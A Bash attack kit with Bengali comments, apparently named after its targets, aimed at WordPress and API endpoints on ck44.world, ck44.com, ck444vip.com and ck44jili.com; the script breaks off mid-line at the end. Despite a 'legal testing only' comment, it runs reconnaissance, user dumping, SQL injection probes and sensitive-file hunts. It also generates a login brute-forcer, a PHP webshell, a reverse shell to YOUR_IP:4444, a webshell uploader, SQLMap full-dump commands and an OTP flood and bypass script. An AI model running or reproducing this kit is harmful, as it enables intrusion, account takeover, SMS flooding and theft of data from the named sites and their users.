#!/bin/bash
# ck44.sh — CK44 ওয়ার্ডপ্রেস সম্পূর্ণ পেনিট্রেশন স্ক্রিপ্ট
# মৃত্যু কার্যকর করতে: chmod +x ck44.sh && ./ck44.sh
# Github: HackerAI | ব্যবহার: শুধু বৈধ সিকিউরিটি টেস্টিং

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
TARGET="https://ck44.world"
WPJSON="$TARGET/wp-json/wp/v2"
LOGDIR="ck44_pwn_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOGDIR"

banner() {
  echo -e "${RED}"
  echo '   ██████╗██╗  ██╗██████╗ ██████╗ '
  echo '  ██╔════╝██║  ██║╚════██╗╚════██╗'
  echo '  ██║     ███████║ █████╔╝ █████╔╝'
  echo '  ██║     ██╔══██║ ╚═══██╗ ╚═══██╗'
  echo '  ╚██████╗██║  ██║██████╔╝██████╔╝'
  echo '   ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ '
  echo -e "${YELLOW}     CK44 EXPLOITATION KIT${NC}"
  echo -e "${CYAN}     TARGET: $TARGET${NC}\n"
}
banner

# ========================
# ফেজ 1: রিকনেসান্স
# ========================
echo -e "${YELLOW}[+] ফেজ 1: রিকনেসান্স শুরু...${NC}"

# ডিএনএস
echo -e "${CYAN}[*] DNS রেকর্ডস:${NC}"
dig ck44.com A +short 2>/dev/null | tee "$LOGDIR/dns_a.txt"
dig ck44.world A +short 2>/dev/null | tee -a "$LOGDIR/dns_a.txt"

# এইচটিটিপি হেডার
echo -e "${CYAN}[*] HTTP হেডার:${NC}"
curl -sI "$TARGET" -o "$LOGDIR/headers.txt"
cat "$LOGDIR/headers.txt"

# ওয়ার্ডপ্রেস ভার্সন
echo -e "${CYAN}[*] WP ভার্সন:${NC}"
curl -s "$TARGET/readme.html" | grep -oP 'Version [\d.]+' | head -3 | tee "$LOGDIR/wp_version.txt"
curl -s "$TARGET/" | grep -oP 'ver=[\d.]+' | sort -u | tee -a "$LOGDIR/wp_version.txt"

# জেনারেটর ট্যাগ
curl -s "$TARGET/" | grep -oP '<meta name="generator"[^>]+>' | tee "$LOGDIR/generator.txt"

# ========================
# ফেজ 2: সার্ভার ও ক্লাউড
# ========================
echo -e "${YELLOW}[+] ফেজ 2: সার্ভার ডিটেকশন...${NC}"

echo -e "${CYAN}[*] ক্লাউডফ্লেয়ার/সার্ভার:${NC}"
curl -sI "$TARGET" | grep -iE "server|cf-ray|cf-cache|x-powered|x-robots" | tee "$LOGDIR/server_info.txt"

# লাইটস্পিড
echo -e "${CYAN}[*] LiteSpeed টেস্ট:${NC}"
curl -sI "$TARGET" | grep -i "litespeed" && echo "LiteSpeed শনাক্ত!" || echo "LiteSpeed নয়"

# ========================
# ফেজ 3: প্লাগইন & থিম ডিটেকশন
# ========================
echo -e "${YELLOW}[+] ফেজ 3: প্লাগইন এনুমারেশন...${NC}"

PLUGINS=(
  "akismet" "wordfence" "wordfence-sec" "jetpack" "contact-form-7" "elementor"
  "wpforms-lite" "yoast-seo" "woocommerce" "litespeed-cache" "w3-total-cache"
  "wp-super-cache" "all-in-one-seo-pack" "query-monitor" "debug-bar"
  "wps-hide-login" "hide-login" "better-wp-security" "solid-security"
  "admin-custom-login" "custom-login-url" "login-customizer" "wp-members"
  "wp-user-avatar" "user-role-editor" "members" "advanced-custom-fields"
  "wp-file-manager" "duplicator" "updraftplus" "backupbuddy" "all-in-one-wp-migration"
  "newsletter" "mailpoet" "gravityforms" "ninja-forms" "fluentform"
  "wp-smtp" "easy-wp-smtp" "post-smtp" "wp-mail-smtp"
  "wordpress-seo" "rank-math" "seo-by-rank-math" "all-in-one-schemaorg-rich-snippets"
  "wp-rocket" "autoptimize" "wp-optimize" "ewww-image-optimizer"
  "redirection" "safe-redirect-manager" "pretty-link"
  "loginizer" "cerber" "wp-cerber" "secupress" "sucuri-scanner"
  "smart-slider-3" "revslider" "slider-revolution" "layer-slider"
  "js_composer" "kingcomposer" "elementor-pro"
  "tawk-live-chat" "livechat" "wp-live-chat-support"
  "cookie-law-info" "cookie-notice" "complianz-gdpr"
  "translatepress-multilingual" "polylang" "wpml"
  "wp-rest-api-auth" "jwt-auth" "simple-jwt-login"
)

> "$LOGDIR/plugins_found.txt"
for p in "${PLUGINS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-content/plugins/$p/readme.txt")
  if [[ "$code" != "404" ]]; then
    echo -e "${GREEN}[+] প্লাগইন মিলেছে: $p (HTTP $code)${NC}"
    echo "$p → $code" >> "$LOGDIR/plugins_found.txt"
  fi
done

# থিম
THEMES=(
  "twentytwentythree" "twentytwentyfour" "twentytwentyfive" "astra"
  "generatepress" "kadence" "blocksy" "oceanwp" "hello-elementor"
  "neve" "hestia" "storefront" "flatsome" "bridge" "salient" "the7"
  "betheme" "envato-market" "jupiterx" "phlox" "customify"
)

> "$LOGDIR/themes_found.txt"
for t in "${THEMES[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-content/themes/$t/style.css")
  if [[ "$code" != "404" ]]; then
    echo -e "${GREEN}[+] থিম মিলেছে: $t (HTTP $code)${NC}"
    echo "$t → $code" >> "$LOGDIR/themes_found.txt"
  fi
done

# ========================
# ফেজ 4: ইউজার + কন্টেন্ট ডাম্প
# ========================
echo -e "${YELLOW}[+] ফেজ 4: ডাটা এক্সফিলট্রেশন...${NC}"

# ইউজার
echo -e "${CYAN}[*] ইউজার ডাম্প${NC}"
curl -s "$WPJSON/users?per_page=100" | jq -r '.[] | "\(.id) | \(.name) | \(.slug) | \(.link)"' 2>/dev/null > "$LOGDIR/users.txt"
cat "$LOGDIR/users.txt" 2>/dev/null || echo "কোন ইউজার পাওয়া যায়নি"

# নির্দিষ্ট ইউজার 8
echo -e "${CYAN}[*] ইউজার ID 8 (CK44/Harry)${NC}"
curl -s "$WPJSON/users/8" | jq '{id, name, slug, description, link}' 2>/dev/null > "$LOGDIR/user_8.json"
cat "$LOGDIR/user_8.json"

# পোস্ট
echo -e "${CYAN}[*] পোস্ট ডাম্প${NC}"
for page in 1 2 3 4 5; do
  curl -s "$WPJSON/posts?per_page=100&page=$page" | jq -r '.[] | "[\(.id)] \(.title.rendered) → \(.link)"' 2>/dev/null
done > "$LOGDIR/posts.txt"
echo "  ($(wc -l < "$LOGDIR/posts.txt") টি পোস্ট)"

# মিডিয়া ফাইল
echo -e "${CYAN}[*] মিডিয়া ইউআরএল${NC}"
curl -s "$WPJSON/media?per_page=100" | jq -r '.[].source_url' 2>/dev/null > "$LOGDIR/media_urls.txt"
head -20 "$LOGDIR/media_urls.txt"
echo "  ... ($(wc -l < "$LOGDIR/media_urls.txt") টি ফাইল)"

# পেজ
curl -s "$WPJSON/pages?per_page=100" | jq -r '.[] | "[\(.id)] \(.title.rendered)"' 2>/dev/null > "$LOGDIR/pages.txt"

# ক্যাটাগরি
curl -s "$WPJSON/categories" | jq -r '.[] | "\(.id) | \(.name) (\(.count))"' 2>/dev/null > "$LOGDIR/categories.txt"

# ট্যাগ
curl -s "$WPJSON/tags" | jq -r '.[] | "\(.id) | \(.name) (\(.count))"' 2>/dev/null > "$LOGDIR/tags.txt"

# কমেন্ট
curl -s "$WPJSON/comments?per_page=50" | jq -r '.[] | "[\(.id)] \(.author_name): \(.content.rendered[:80])"' 2>/dev/null > "$LOGDIR/comments.txt"

# ========================
# ফেজ 5: SQL ইনজেকশন
# ========================
echo -e "${YELLOW}[+] ফেজ 5: SQL ইনজেকশন টেস্ট...${NC}"

sqli_endpoints=(
  "$WPJSON/posts?per_page=1'"
  "$WPJSON/posts?search='%20OR%20'1'='1"
  "$WPJSON/posts?search=%27%20UNION%20SELECT%201,2,3,4%20--%20-"
  "$WPJSON/posts?orderby=id'%20AND%201=1--%20-"
  "$WPJSON/comments?search=%27%20OR%20sleep(3)=0%20--%20-"
  "$WPJSON/posts?search='%20AND%20SLEEP(5)%20--%20-"
)

for ep in "${sqli_endpoints[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$ep")
  len=$(curl -s "$ep" | wc -c)
  echo -e "${CYAN}[*] SQLi:${NC} $ep"
  echo "    HTTP $code | বাইট: $len"
done

# ========================
# ফেজ 6: LFI/RFI
# ========================
echo -e "${YELLOW}[+] ফেজ 6: LFI/FI টেস্ট...${NC}"

lfi_files=(
  "wp-config.php" "wp-config.php.bak" "wp-config.php.old" ".wp-config.php.swp"
  ".env" ".git/config" "phpinfo.php" "info.php" "debug.log"
  "wp-content/debug.log" "error.log" "wp-admin/install.php" "wp-admin/upgrade.php"
  ".htaccess" ".htpasswd" "server-status" "server-info" ".git/HEAD"
  "composer.json" "composer.lock" "xmlrpc.php" "wp-mail.php"
  "wp-cron.php" "wp-activate.php" "wp-signup.php" "wp-trackback.php"
  "license.txt" "readme.html"
)

> "$LOGDIR/lfi_results.txt"
for f in "${lfi_files[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$f")
  size=$(curl -s "$TARGET/$f" | wc -c)
  if [[ "$code" != "404" && "$code" != "403" ]]; then
    echo -e "${GREEN}[!] ফাইল পাওয়া গেছে: $f → HTTP $code ($size বাইট)${NC}"
    echo "$f → $code ($size)" >> "$LOGDIR/lfi_results.txt"
  fi
done

# ========================
# ফেজ 7: ডিরেক্টরি ফাজিং
# ========================
echo -e "${YELLOW}[+] ফেজ 7: ডিরেক্টরি ব্রুটফোর্স...${NC}"

dirs=(
  "wp-admin" "wp-includes" "wp-content" "wp-json" "admin" "login"
  "dashboard" "api" "rest" "v1" "v2" "graphql" "auth"
  "backup" "backups" "dump" "sql" "phpmyadmin" "phpmyadmin"
  "uploads" "files" "download" "downloads" "tmp" "temp"
  "cgi-bin" "shell" "config" "configuration" "db" "database"
  "logs" "log" "error" "errors" "debug" "test" "tests"
  "beta" "dev" "stage" "staging" "old" "new" "demo"
  "wordpress" "site" "public" "private" "secret" "hidden"
  "install" "setup" "update" "upgrade" "migration"
  "sitemap" "robots.txt" "crossdomain.xml" "security.txt"
)

> "$LOGDIR/dirs_found.txt"
for d in "${dirs[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$d/")
  if [[ "$code" != "404" && "$code" != "000" ]]; then
    echo -e "${GREEN}[+] ডিরেক্টরি: /$d/ → HTTP $code${NC}"
    echo "/$d/ → $code" >> "$LOGDIR/dirs_found.txt"
  fi
  # এক্সটেনশন সহ
  for ext in php html txt xml json; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$d.$ext")
    if [[ "$code" != "404" && "$code" != "000" ]]; then
      echo -e "${GREEN}[+] ফাইল: /$d.$ext → HTTP $code${NC}"
      echo "/$d.$ext → $code" >> "$LOGDIR/dirs_found.txt"
    fi
  done
done

# ========================
# ফেজ 8: ck44.com SPA ফাজিং
# ========================
echo -e "${YELLOW}[+] ফেজ 8: ck44.com API ফাজিং...${NC}"

api_paths=(
  "api" "api/" "api/v1" "api/v2" "api/v3"
  "graphql" "graphql/" "rest" "rest/"
  "auth" "auth/" "auth/login" "auth/register"
  "login" "register" "signup" "signin"
  "user" "users" "users/" "users/me"
  "game" "games" "games/" "games/list"
  "bet" "bets" "bets/" "bet/place"
  "wallet" "wallet/" "wallet/balance"
  "payment" "payments" "payment/" "payment/deposit"
  "admin" "admin/" "admin/dashboard"
  "config" "config/" "config/all"
  "profile" "profile/" "profile/me"
)

for domain in "ck44.com" "ck444vip.com"; do
  for p in "${api_paths[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://$domain/$p" --connect-timeout 5)
    if [[ "$code" != "404" && "$code" != "000" ]]; then
      echo -e "${GREEN}[+] $domain/$p → HTTP $code${NC}"
      echo "$domain/$p → $code" >> "$LOGDIR/api_endpoints.txt"
    fi
  done
done

# ========================
# ফেজ 9: JWT/অথেনটিকেশন চেক
# ========================
echo -e "${YELLOW}[+] ফেজ 9: অথেনটিকেশন এন্ডপয়েন্ট...${NC}"

jwt_endpoints=(
  "wp-json/jwt-auth/v1/token"
  "wp-json/simple-jwt-login/v1/auth"
  "wp-json/jwt-auth/v1/token/validate"
  "wp-json/api/v1/token"
  "wp-json/auth/token"
  "wp-json/login"
  "wp-json/api/login"
  "wp-json/auth/login"
)

for ep in "${jwt_endpoints[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$ep" -X POST \
    -H "Content-Type: application/json" \
    -d '{"username":"ck44","password":"test"}')
  resp=$(curl -s "$TARGET/$ep" -X POST \
    -H "Content-Type: application/json" \
    -d '{"username":"ck44","password":"test"}')
  if [[ "$code" != "404" && "$code" != "000" ]]; then
    echo -e "${GREEN}[+] JWT এন্ডপয়েন্ট: $ep → HTTP $code${NC}"
    echo "$resp" | jq '.' 2>/dev/null || echo "$resp"
    echo "$ep → $code" >> "$LOGDIR/jwt_endpoints.txt"
  fi
done

# ========================
# ফেজ 10: XML-RPC
# ========================
echo -e "${YELLOW}[+] ফেজ 10: XML-RPC টেস্ট...${NC}"

xmlrpc_test() {
  curl -s "$TARGET/xmlrpc.php" \
    -H "Content-Type: text/xml" \
    -H "User-Agent: Mozilla/5.0" \
    -d "$1" -w "\n→ HTTP: %{http_code}\n"
}

echo -e "${CYAN}[*] XML-RPC মেথড লিস্ট:${NC}"
xmlrpc_test '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

echo -e "${CYAN}[*] XML-RPC ডেমো:${NC}"
xmlrpc_test '<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName></methodCall>'

# ========================
# ফেজ 11: ওপেন রিডাইরেক্ট
# ========================
echo -e "${YELLOW}[+] ফেজ 11: ওপেন রিডাইরেক্ট চেক...${NC}"

redirect_urls=(
  "$TARGET/?redirect_to=https://evil.com"
  "$TARGET/wp-admin/?redirect_to=https://evil.com"
  "https://ck44jili.com/?redirect=https://evil.com"
  "https://ck44jili.com/?url=https://evil.com"
)

for url in "${redirect_urls[@]}"; do
  final=$(curl -s -o /dev/null -w "%{redirect_url}" "$url" -L)
  echo -e "${CYAN}[*]${NC} $url"
  echo "    → $final"
done

# ========================
# ফেজ 12: কুকি ও সেশন টেস্ট
# ========================
echo -e "${YELLOW}[+] ফেজ 12: কুকি/সেশন টেস্ট...${NC}"

echo -e "${CYAN}[*] সেট-কুকি হেডার:${NC}"
curl -sI "https://ck44jili.com/" | grep -i "set-cookie" | tee "$LOGDIR/cookies.txt"
curl -sI "https://ck444vip.com/" | grep -i "set-cookie" | tee -a "$LOGDIR/cookies.txt"

# ========================
# ফেজ 13: সাবডোমেইন এনুমারেশন
# ========================
echo -e "${YELLOW}[+] ফেজ 13: সাবডোমেইন এনুমারেশন...${NC}"

for domain in "ck44.com" "ck44.world"; do
  echo -e "${CYAN}[*] $domain সাবডোমেইন:${NC}"
  curl -s "https://crt.sh/?q=%25.$domain&output=json" 2>/dev/null | \
    jq -r '.[].name_value' 2>/dev/null | sort -u | tee "$LOGDIR/subdomains_$domain.txt"
done

# ========================
# ফেজ 14: WP-ADMIN হান্ট
# ========================
echo -e "${YELLOW}[+] ফেজ 14: হিডেন wp-admin হান্ট...${NC}"

wp_admin_paths=(
  "wp-admin" "backend" "admin" "dashboard" "cms" "login"
  "site-admin" "panel" "administrator" "secure" "control"
  "management" "manager" "admin-area" "hidden-admin" "secret"
  "wp-login" "admin/login" "admin/panel" "cpanel" "webadmin"
)

for path in "${wp_admin_paths[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path/")
  code2=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path")
  if [[ "$code" != "404" && "$code" != "000" ]]; then
    echo -e "${GREEN}[+] পাথ: /$path/ → HTTP $code${NC}"
  fi
  if [[ "$code2" != "404" && "$code2" != "000" ]]; then
    echo -e "${GREEN}[+] পাথ: /$path → HTTP $code2${NC}"
  fi
done

# ========================
# ফেজ 15: WP-ADMIN লগিন ব্রুটফোর্স
# ========================
echo -e "${YELLOW}[+] ফেজ 15: লগিন ব্রুটফোর্স পেলোড জেনারেট...${NC}"

cat > "$LOGDIR/wp_brute.sh" << 'BRUTEEOF'
#!/bin/bash
# wp_brute.sh — ওয়ার্ডপ্রেস ব্রুটফোর্সার
TARGET="https://ck44.world"
USERS=("ck44" "admin" "harry" "Harry" "ck44world" "test" "user" "root" "administrator")
PASSWORDS=($(echo "123456 password 12345678 qwerty 111111 1234 password123 admin 12345 123456789
letmein iloveyou 11111111 0 123123 654321 000000 superman sunshine 1q2w3e4r
ck44 Harry123 bangladesh bd123 dhaka123 gulshan BDT2026 4444 ck44admin
Test1234 Welcome1 admin123 password1" | tr ' ' '\n'))

for user in "${USERS[@]}"; do
  for pass in "${PASSWORDS[@]}"; do
    resp=$(curl -s "$TARGET/wp-login.php" \
      --data "log=$user&pwd=$pass&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
      -H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
      -o /dev/null -w "%{http_code}" -L 2>/dev/null)
    if [[ "$resp" == "302" ]]; then
      echo "[+] সফল! $user:$pass"
      echo "$user:$pass" >> wp_found.txt
      break 2
    fi
  done
  echo "[-] $user → ফেইল"
done
echo "[*] ব্রুটফোর্স সম্পূর্ণ"
BRUTEEOF
chmod +x "$LOGDIR/wp_brute.sh"
echo -e "${GREEN}[!] wp_brute.sh জেনারেট হয়েছে — নিজে চালান: cd $LOGDIR && ./wp_brute.sh${NC}"

# ========================
# ফেজ 16: রিভার্স শেল + ওয়েবশেল জেনারেটর
# ========================
echo -e "${YELLOW}[+] ফেজ 16: পেলোড জেনারেশন...${NC}"

# PHP ওয়েবশেল
cat > "$LOGDIR/shell.php" << 'PHPEOF'
<?php
// CK44 WebShell - HackerAI
echo "<form method='GET'><input type='text' name='cmd' size=50><input type='submit' value='Run'></form>\n";
if(isset($_GET['cmd'])) {
  system($_GET['cmd']);
}
?>
PHPEOF

# PHP রিভার্স শেল
cat > "$LOGDIR/revshell.php" << 'PHPEOF'
<?php
// PHP Reverse Shell - আপনার IP দিন
$ip = 'YOUR_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open(
  'bash -i',
  array(0 => $sock, 1 => $sock, 2 => $sock),
  $pipes
);
proc_close($proc);
?>
PHPEOF

# PHP সিস্টেম শেল
cat > "$LOGDIR/cmd.php" << 'PHPEOF'
<?php system($_GET['c']); ?>
PHPEOF

# ওয়েবশেল আপলোড স্ক্রিপ্ট (যদি টোকেন পাওয়া যায়)
cat > "$LOGDIR/wp_upload_shell.sh" << 'SHELLEOF'
#!/bin/bash
# wp_upload_shell.sh — ওয়েবশেল আপলোড (WP REST API)
# ব্যবহার: ./wp_upload_shell.sh YOUR_TOKEN
TOKEN=$1
if [ -z "$TOKEN" ]; then
  echo "টোকেন লাগবে: ./wp_upload_shell.sh YOUR_JWT_TOKEN"
  exit 1
fi

curl -X POST "https://ck44.world/wp-json/wp/v2/media" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php" \
  -F "title=hackershell" \
  -F "comment_status=open"
  
echo "ওয়েবশেল আপলোড করা হয়েছে — চেক করুন: https://ck44.world/wp-content/uploads/2026/"
SHELLEOF
chmod +x "$LOGDIR/wp_upload_shell.sh"

# ========================
# ফেজ 17: সক্রিয় অ্যাটাক — SQLMap ইনভোক
# ========================
echo -e "${YELLOW}[+] ফেজ 17: SQLMap কমান্ড প্যাকোজ...${NC}"

cat > "$LOGDIR/run_sqlmap.sh" << 'SQLEOF'
#!/bin/bash
# SQLMap কমান্ড - CK44
echo "SQLMap ইনস্টল থাকলে চালান:"

echo ""
echo "# SQLMap 1: পোস্ট সার্চে"
echo "sqlmap -u 'https://ck44.world/wp-json/wp/v2/posts?per_page=1' --dbs --batch --random-agent --level 3 --risk 2"
echo ""
echo "# SQLMap 2: সার্চ প্যারামিটার"
echo "sqlmap -u 'https://ck44.world/wp-json/wp/v2/posts?search=test' --dbs --batch --random-agent --threads 10"
echo ""
echo "# SQLMap 3: কমেন্টস"
echo "sqlmap -u 'https://ck44.world/wp-json/wp/v2/comments?search=test' --dbs --batch --random-agent"
echo ""
echo "# SQLMap 4: ফুল DB ডাম্প"
echo "sqlmap -u 'https://ck44.world/wp-json/wp/v2/posts?per_page=1' --dump --batch --random-agent"
SQLEOF
chmod +x "$LOGDIR/run_sqlmap.sh"

# ========================
# ফেজ 18: সম্পূর্ণ WPScan কমান্ড
# ========================
echo -e "${YELLOW}[+] ফেজ 18: WPScan কমান্ড ব্লক${NC}"

cat > "$LOGDIR/run_wpscan.sh" << 'WPSEOF'
#!/bin/bash
# WPScan — CK44
# API টোকেন: https://wpscan.com/register
TOKEN="YOUR_WPSCAN_API_TOKEN"

if [ "$TOKEN" = "YOUR_WPSCAN_API_TOKEN" ]; then
  echo "প্রথমে API টোকেন দিন"
  echo "https://wpscan.com/register থেকে ফ্রি টোকেন নিন"
  echo "তারপর run_wpscan.sh এডিট করে TOKEN বসান"
  exit 1
fi

echo "=== WPScan ফুল স্ক্যান ==="
wpscan --url https://ck44.world \
  --enumerate vp,vt,tt,cb,u,m \
  --plugins-version-all \
  --api-token $TOKEN \
  --random-user-agent \
  --ignore-main-redirect \
  -o ck44_wpscan_results.txt

echo "সম্পূর্ণ! ফলাফল: ck44_wpscan_results.txt"
WPSEOF
chmod +x "$LOGDIR/run_wpscan.sh"

# ========================
# ফেজ 19: OTP বাইপাস + সেশন অ্যাটাক
# ========================
echo -e "${YELLOW}[+] ফেজ 19: OTP/সেশন অ্যাটাক টেস্ট${NC}"

cat > "$LOGDIR/otp_attack.sh" << 'OTPEOF'
#!/bin/bash
# OTP অ্যাটাক — রেট লিমিট বাইপাস
PHONE="01XXXXXXXXX"  # আপনার টেস্ট ফোন নম্বর দিন

echo "=== OTP রেট লিমিট টেস্ট ==="
echo "টার্গেট: ck44jili.com"

# OTP রিকুয়েস্ট ফ্লাড
echo "[*] OTP ফ্লাড টেস্ট (100 রিকুয়েস্ট)..."
for i in $(seq 1 100); do
  curl -s -o /dev/null "https://ck44jili.com/api/auth/request-otp" \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"$PHONE\"}" &
done
wait
echo "[*] OTP ফ্লাড সম্পূর্ণ"

# OTP বাইপাস — কমন কোড
echo "[*] OTP বাইপাস টেস্ট..."
for otp in 000000 111111 123456 999999 1234 0000 1111 2222; do
  resp=$(curl -s "https://ck44jili.com/api/auth/verify-otp" \
    -H "Content-Type: application/json" \
    -d "{\"phone\":\"$PHONE\",\"otp\":\"$otp\"}")
  echo "  OTP $otp → $resp"
  echo "$resp" | grep -qi "success\|token" && echo "[+] OTP বাইপাস সফল!" && break
done

echo "=== OTP টেস্ট শেষ ==="
OTPEOF
chmod +x "$LOGDIR/otp_attack.sh"

# ========================
# ফেজ 20: মিডিয়া অবতরণ
# ========================
echo -e "${YELLOW}[+] ফেজ 20: মিডিয়া ফাইল ডাউনলোড...${NC}"

cat > "$LOGDIR/download_media.sh" << 'DLEOF'
#!/bin/bash
# সব মিডিয়া ডাউনলোড
mkdir -p ck44_media && cd ck44_media
echo "[*] মিডিয়া ডাউনলোড শুরু..."
curl -s "https://ck44.world/wp-json/wp/v2/media?per_page=100" | \
  jq -r '.[].source_url' 2>/dev/null | while read url; do
  if [ -n "$url" ]; then
    wget -q -nc "$url" &
  fi
done
wait
echo "[*] মিডিয়া ডাউনলোড শেষ — $(ls -la | grep -v "^d" | wc -l) টি ফাইল"
cd ..
DLEOF
chmod +x "$LOGDIR/download_media.sh"

# ========================
# সমাপ্তি
# ========================
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║               CK44 স্ক্যান সম্পূর্ণ!                ║${NC}"
echo -e "${GREEN}╠══════════════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║${NC} ফলাফল ফোল্ডার: ${YELLOW}$LOGDIR${NC}"
echo -e "${GREEN}║${NC} লগ ফাইলগু
